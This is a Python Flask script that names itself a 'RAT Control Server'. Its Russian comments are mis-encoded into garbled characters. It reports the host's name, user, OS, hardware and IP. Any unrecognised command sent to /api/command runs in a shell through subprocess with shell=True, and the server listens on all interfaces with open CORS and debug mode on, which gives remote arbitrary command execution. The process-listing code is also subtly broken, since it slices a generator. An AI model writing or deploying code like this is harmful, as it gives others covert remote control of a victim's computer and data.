from flask import Flask, request, jsonify
from flask_cors import CORS
import psutil
import platform
import socket
import getpass
import datetime
import subprocess
import os

app = Flask(__name__)
CORS(app)  # –†–∞–∑—Ä–µ—à–∞–µ–º –∑–∞–ø—Ä–æ—Å—ã —Å —Å–∞–π—Ç–∞

# –ö–æ—Ä–Ω–µ–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
@app.route('/')
def index():
    return "‚úÖ RAT Control Server is running!"

# API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
@app.route('/api/info', methods=['GET'])
def get_info():
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('C:\\')
    boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify({
        'success': True,
        'data': {
            'computer': platform.node(),
            'user': getpass.getuser(),
            'os': f"{platform.system()} {platform.release()}",
            'boot': boot,
            'cpu': cpu,
            'ram_used': mem.used // 1024**3,
            'ram_total': mem.total // 1024**3,
            'ram_percent': mem.percent,
            'disk_used': disk.used // 1024**3,
            'disk_total': disk.total // 1024**3,
            'disk_percent': disk.percent,
            'ip': socket.gethostbyname(socket.gethostname())
        }
    })

# API –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥
@app.route('/api/command', methods=['POST'])
def run_command():
    data = request.json
    cmd = data.get('command', '')
    
    if cmd == 'info':
        return get_info()
    
    elif cmd == 'cpu':
        cpu_percent = psutil.cpu_percent(percpu=True)
        freq = psutil.cpu_freq()
        return jsonify({
            'success': True,
            'data': {
                'cores': cpu_percent,
                'freq': freq.current if freq else 0
            }
        })
    
    elif cmd == 'processes':
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent'])[:20]:
            processes.append({
                'pid': proc.info['pid'],
                'name': proc.info['name'],
                'cpu': proc.info['cpu_percent']
            })
        return jsonify({'success': True, 'data': processes})
    
    else:
        # –í—ã–ø–æ–ª–Ω—è–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é –∫–æ–º–∞–Ω–¥—É
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return jsonify({
                'success': True,
                'output': result.stdout + result.stderr
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("="*60)
    print("üöÄ RAT CONTROL SERVER")
    print("="*60)
    print("‚úÖ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω!")
    print(f"üåê –õ–æ–∫–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å: http://localhost:5000")
    print(f"üåê –í —Å–µ—Ç–∏ –∞–¥—Ä–µ—Å: http://{socket.gethostbyname(socket.gethostname())}:5000")
    print("="*60)
    app.run(host='0.0.0.0', port=5000, debug=True)
